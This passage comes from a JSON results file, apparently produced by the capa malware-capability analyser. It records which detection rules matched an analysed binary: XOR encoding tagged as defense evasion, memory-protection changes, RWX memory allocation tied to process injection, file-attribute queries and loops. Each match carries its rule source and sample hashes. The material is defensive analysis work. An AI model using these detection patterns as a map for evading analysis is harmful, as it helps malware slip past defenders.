                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetFileAttributes"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651791836
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwQueryDirectoryFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwQueryInformationFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtQueryDirectoryFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtQueryInformationFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::GetAttributes"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::GetCreationTime"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::GetCreationTimeUtc"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::GetLastAccessTime"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::GetLastAccessTimeUtc"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::GetLastWriteTime"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::GetLastWriteTimeUtc"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "property",
                      "access": "read",
                      "property": "System.IO.FileSystemInfo::Attributes"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "stat"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "fstat"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "lstat"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "fstatat"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651791861
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetFileAttributes"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651791864
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwQueryDirectoryFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwQueryInformationFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtQueryDirectoryFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtQueryInformationFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::GetAttributes"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::GetCreationTime"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::GetCreationTimeUtc"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::GetLastAccessTime"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::GetLastAccessTimeUtc"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::GetLastWriteTime"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::GetLastWriteTimeUtc"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "property",
                      "access": "read",
                      "property": "System.IO.FileSystemInfo::Attributes"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "stat"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "fstat"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "lstat"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "fstatat"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "encode data using XOR": {
        "meta": {
          "name": "encode data using XOR",
          "namespace": "data-manipulation/encoding/xor",
          "authors": [
            "moritz.raabe@mandiant.com"
          ],
          "scopes": {
            "static": "basic block"
          },
          "attack": [
            {
              "parts": [
                "Defense Evasion",
                "Obfuscated Files or Information"
              ],
              "tactic": "Defense Evasion",
              "technique": "Obfuscated Files or Information",
              "subtechnique": "",
              "id": "T1027"
            }
          ],
          "mbc": [
            {
              "parts": [
                "Defense Evasion",
                "Obfuscated Files or Information",
                "Encoding-Standard Algorithm"
              ],
              "objective": "Defense Evasion",
              "behavior": "Obfuscated Files or Information",
              "method": "Encoding-Standard Algorithm",
              "id": "E1027.m02"
            },
            {
              "parts": [
                "Data",
                "Encode Data",
                "XOR"
              ],
              "objective": "Data",
              "behavior": "Encode Data",
              "method": "XOR",
              "id": "C0026.002"
            }
          ],
          "references": [],
          "examples": [
            "2D3EDC218A90F03089CC01715A9F047F:0x403D7E"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: encode data using XOR\r\n    namespace: data-manipulation/encoding/xor\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n    scopes:\r\n      static: basic block\r\n      dynamic: unsupported  # requires characteristic, Not features\r\n    att&ck:\r\n      - Defense Evasion::Obfuscated Files or Information [T1027]\r\n    mbc:\r\n      - Defense Evasion::Obfuscated Files or Information::Encoding-Standard Algorithm [E1027.m02]\r\n      - Data::Encode Data::XOR [C0026.002]\r\n    examples:\r\n      - 2D3EDC218A90F03089CC01715A9F047F:0x403D7E\r\n  features:\r\n    - and:\r\n      - characteristic: tight loop\r\n      - characteristic: nzxor\r\n      - not:\r\n        - description: filter for potential false positives\r\n        - or:\r\n          - or:\r\n            - description: unsigned bitwise negation operation (~i)\r\n            - number: 0xFFFFFFFF = bitwise negation for unsigned 32 bits\r\n            - number: 0xFFFFFFFFFFFFFFFF = bitwise negation for unsigned 64 bits\r\n          - or:\r\n            - description: signed bitwise negation operation (~i)\r\n            - number: 0x0FFFFFFF = bitwise negation for signed 32 bits\r\n            - number: 0x0FFFFFFFFFFFFFFF = bitwise negation for signed 64 bits\r\n          - or:\r\n            - description: Magic constants used in the implementation of strings functions.\r\n            # such as `strlen` and `strcat` in the Windows standard library:\r\n            # (((i - 0x81010101) ^ ~i) & 0x81010100)\r\n            ## 32 bits\r\n            - number: 0x7EFEFEFF = optimized string constant for 32 bits\r\n            - number: 0x81010101 = -0x81010101 = 0x7EFEFEFF\r\n            - number: 0x81010100 = 0x81010100 = ~0x7EFEFEFF\r\n            ## 64 bits\r\n            - number: 0x7EFEFEFEFEFEFEFF = optimized string constant for 64 bits\r\n            - number: 0x8101010101010101 = -0x8101010101010101 = 0x7EFEFEFEFEFEFEFF\r\n            - number: 0x8101010101010100 = 0x8101010101010100 = ~0x7EFEFEFEFEFEFEFF\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651794032
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651794032
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "nzxor"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651794095
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "not",
                      "description": "filter for potential false positives"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "or",
                              "description": "unsigned bitwise negation operation (~i)"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 4294967295,
                                  "description": "bitwise negation for unsigned 32 bits"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 18446744073709551615,
                                  "description": "bitwise negation for unsigned 64 bits"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "or",
                              "description": "signed bitwise negation operation (~i)"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 268435455,
                                  "description": "bitwise negation for signed 32 bits"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 1152921504606846975,
                                  "description": "bitwise negation for signed 64 bits"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "or",
                              "description": "Magic constants used in the implementation of strings functions."
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 2130640639,
                                  "description": "optimized string constant for 32 bits"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 2164326657,
                                  "description": "-0x81010101 = 0x7EFEFEFF"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 2164326656,
                                  "description": "0x81010100 = ~0x7EFEFEFF"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 9151031864016699135,
                                  "description": "optimized string constant for 64 bits"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 9295712209692852481,
                                  "description": "-0x8101010101010101 = 0x7EFEFEFEFEFEFEFF"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 9295712209692852480,
                                  "description": "0x8101010101010100 = ~0x7EFEFEFEFEFEFEFF"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "change memory protection": {
        "meta": {
          "name": "change memory protection",
          "authors": [
            "@mr-tz"
          ],
          "scopes": {
            "static": "basic block",
            "dynamic": "call"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "Memory",
                "Change Memory Protection"
              ],
              "objective": "Memory",
              "behavior": "Change Memory Protection",
              "method": "",
              "id": "C0008"
            }
          ],
          "references": [],
          "examples": [
            "Practical Malware Analysis Lab 11-02.dll_:0x10001203"
          ],
          "description": "",
          "lib": true,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: change memory protection\r\n    authors:\r\n      - \"@mr-tz\"\r\n    lib: true\r\n    scopes:\r\n      static: basic block\r\n      dynamic: call\r\n    mbc:\r\n      - Memory::Change Memory Protection [C0008]\r\n    examples:\r\n      - Practical Malware Analysis Lab 11-02.dll_:0x10001203\r\n  features:\r\n    - or:\r\n      - api: kernel32.VirtualProtect\r\n      - api: kernel32.VirtualProtectEx\r\n      - api: NtProtectVirtualMemory\r\n      - api: ZwProtectVirtualMemory\r\n      - basic block:\r\n        - and:\r\n          - match: link function at runtime on Windows\r\n          - or:\r\n            - string: \"VirtualProtect\"\r\n            - string: \"VirtualProtectEx\"\r\n            - string: \"NtProtectVirtualMemory\"\r\n            - string: \"ZwProtectVirtualMemory\"\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651804528
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "VirtualProtect"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651804562
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "VirtualProtectEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtProtectVirtualMemory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwProtectVirtualMemory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "match",
                      "match": "change memory protection/25c211a8979840b9b5c90a4a295d45ff"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651805154
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "VirtualProtect"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651805165
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "VirtualProtectEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtProtectVirtualMemory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwProtectVirtualMemory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "match",
                      "match": "change memory protection/25c211a8979840b9b5c90a4a295d45ff"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "allocate or change RWX memory": {
        "meta": {
          "name": "allocate or change RWX memory",
          "namespace": "host-interaction/process/inject",
          "authors": [
            "@mr-tz",
            "mehunhoff@google.com"
          ],
          "scopes": {
            "static": "basic block",
            "dynamic": "call"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "Memory",
                "Allocate Memory"
              ],
              "objective": "Memory",
              "behavior": "Allocate Memory",
              "method": "",
              "id": "C0007"
            }
          ],
          "references": [],
          "examples": [
            "Practical Malware Analysis Lab 03-03.exe_:0x4010EA",
            "563653399B82CD443F120ECEFF836EA3678D4CF11D9B351BB737573C2D856299:0x140001ABA"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: allocate or change RWX memory\r\n    namespace: host-interaction/process/inject\r\n    authors:\r\n      - \"@mr-tz\"\r\n      - mehunhoff@google.com\r\n    scopes:\r\n      static: basic block\r\n      dynamic: call\r\n    mbc:\r\n      - Memory::Allocate Memory [C0007]\r\n    examples:\r\n      - Practical Malware Analysis Lab 03-03.exe_:0x4010EA\r\n      # ntdll\r\n      - 563653399B82CD443F120ECEFF836EA3678D4CF11D9B351BB737573C2D856299:0x140001ABA\r\n  features:\r\n    - or:\r\n      - basic block:\r\n        - and:\r\n          - or:\r\n            - match: allocate memory\r\n            - match: change memory protection\r\n          - or:\r\n            - number: 0x40 = PAGE_EXECUTE_READWRITE\r\n            # lea     r9d, [rcx+40h]  ; flProtect\r\n            # call    cs:VirtualAlloc\r\n            - instruction:\r\n              - mnemonic: lea\r\n              - offset: 0x40 = PAGE_EXECUTE_READWRITE\r\n      - call:\r\n        - and:\r\n          - or:\r\n            - match: allocate memory\r\n            - match: change memory protection\r\n          - number: 0x40 = PAGE_EXECUTE_READWRITE\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651804528
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "subscope",
                      "scope": "basic block"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "and"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "or"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "match",
                                  "match": "allocate memory"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "match",
                                  "match": "change memory protection"
                                }
                              },
                              "children": [
                                {
                                  "success": true,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "or"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": true,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "api",
                                          "api": "VirtualProtect"
                                        }
                                      },
                                      "children": [],
                                      "locations": [
                                        {
                                          "type": "absolute",
                                          "value": 1651804562
                                        }
                                      ],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "api",
                                          "api": "VirtualProtectEx"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "api",
                                          "api": "NtProtectVirtualMemory"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "api",
                                          "api": "ZwProtectVirtualMemory"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "match",
                                          "match": "change memory protection/25c211a8979840b9b5c90a4a295d45ff"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651804528
                                }
                              ],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "or"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 64,
                                  "description": "PAGE_EXECUTE_READWRITE"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651804538
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "match",
                                  "match": "allocate or change RWX memory/80dba57d6c36495699de93253216d80b/3f5ccef7da6f4075a18770a48379cc3c"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651804528
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "match",
                      "match": "allocate or change RWX memory/13707bbe355e4ef8b0530024ae247fe3"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "contain loop": {
        "meta": {
          "name": "contain loop",
          "authors": [
            "moritz.raabe@mandiant.com"
          ],
          "scopes": {
            "static": "function"
          },
          "attack": [],
          "mbc": [],
          "references": [],
          "examples": [
            "08AC667C65D36D6542917655571E61C8:0x406EAA"
          ],
          "description": "",
          "lib": true,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: contain loop\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n    lib: true\r\n    scopes:\r\n      static: function\r\n      dynamic: unsupported  # requires characteristic features\r\n    examples:\r\n      - 08AC667C65D36D6542917655571E61C8:0x406EAA\r\n  features:\r\n    - or:\r\n      - characteristic: loop\r\n      - characteristic: tight loop\r\n      - characteristic: recursive call\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651773456
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651773456
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651774448
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651774472
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651774768
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651774808
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651775120
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651775160
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651775504
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651775504
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651776352
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
